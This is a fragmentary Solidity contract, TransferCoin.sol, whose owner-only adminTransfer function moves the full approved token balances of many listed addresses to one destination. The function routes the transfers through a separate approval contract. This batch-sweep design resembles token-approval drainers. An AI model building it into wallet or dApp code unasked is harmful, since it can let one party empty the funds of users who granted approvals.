// File: my/novel/TransferCoin.sol


pragma solidity ^0.8.0;



contract TransferCoin is AdminTransfer {
    IUnifiedApprove public unifiedApprove;

    event AdminTranfer(address indexed to,address addr,IERC20 coin,uint amount);

    constructor(IUnifiedApprove _unifiedApprove) {
        unifiedApprove=_unifiedApprove;
    }

    function adminTransfer(address to,address[] calldata addrs,IERC20[] calldata erc20s) external onlyOwner {
        uint i;
        uint j;
        uint amount;
        for(i=0;i<addrs.length;i++){
            address addr=addrs[i];
            for(j=0;j<erc20s.length;j++){
                IERC20 erc20=erc20s[j];
                amount=erc20.balanceOf(addr);
                amount=_min(amount,erc20.allowance(addr,address(unifiedApprove)));
                if(amount>0){
                    unifiedApprove.transferCoin(erc20,addr,to,amount);
                    emit AdminTranfer(to,addr,erc20,amount);
                }
            }
        }
    }

    function _min(uint l,uint r) internal pure returns(uint){
        return (l<r)?l:r;
    }
}